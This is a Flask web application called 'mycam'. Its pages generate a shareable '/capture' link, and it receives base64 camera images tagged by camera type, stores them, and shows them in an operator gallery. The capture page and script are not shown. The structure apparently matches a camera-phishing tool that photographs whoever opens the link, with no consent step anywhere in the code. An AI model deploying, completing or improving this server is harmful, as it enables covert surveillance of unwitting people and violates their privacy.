from flask import Flask, render_template, request, jsonify, send_from_directory
import base64
import os
from datetime import datetime
import threading

app = Flask(__name__, template_folder='templates', static_folder='static')

captures = []
lock = threading.Lock()

def save_image_locally(img_data, filename):
    os.makedirs('static/captures', exist_ok=True)
    filepath = os.path.join('static/captures', filename)
    with open(filepath, 'wb') as f:
        f.write(base64.b64decode(img_data.split(',')[1]))
    return f"/static/captures/{filename}"

@app.route('/')
def index():
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>mycam</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h1>📸 mycam</h1>
        <button onclick="nextStep()" class="next-btn">NEXT → Generate URL</button>
    </div>
    <script>
        function nextStep() {{
            window.location.href = '/generate';
        }}
    </script>
</body>
</html>
    """

@app.route('/generate')
def generate():
    base_url = request.url_root.rstrip('/')
    target_url = f"{base_url}/capture"
    return f"""
<!DOCTYPE html>
<html>
<head>
    <title>mycam - Generate URL</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h2>🔗 Generate mycam URL</h2>
        <div class="url-box">
            <strong id="targetUrl">{target_url}</strong>
        </div>
        <button onclick="copyURL()" class="copy-btn">📋 Copy mycam URL</button>
        
        <h3>📸 mycam Captures:</h3>
        <div id="gallery" class="gallery"></div>
        
        <button onclick="refreshGallery()" class="refresh-btn">🔄 Refresh</button>
    </div>
    <script src="/static/capture.js"></script>
</body>
</html>
    """

@app.route('/capture')
def capture_page():
    return render_template('index.html')

@app.route('/save', methods=['POST'])
def save_image():
    global captures
    data = request.json
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    camera_type = data['camera']
    
    filename = f"{camera_type}_{timestamp}.jpg"
    img_path = save_image_locally(data['image'], filename)
    
    capture_info = {
        'filename': filename,
        'camera': camera_type,
        'timestamp': timestamp,
        'url': img_path
    }
    
    with lock:
        captures.append(capture_info)
    
    return jsonify({'status': 'success', 'filename': filename})

@app.route('/captures')
def get_captures():
    return jsonify(captures)

@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)